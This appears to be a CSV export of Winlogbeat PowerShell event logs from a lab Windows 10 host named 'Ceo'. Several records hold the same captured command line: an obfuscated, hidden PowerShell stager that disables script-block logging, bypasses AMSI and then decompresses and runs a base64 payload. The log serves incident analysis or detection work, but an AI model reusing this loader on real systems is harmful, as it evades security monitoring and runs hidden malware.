[Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4566,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:44.072",hnkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4564,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:44.072",h3kMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2Gl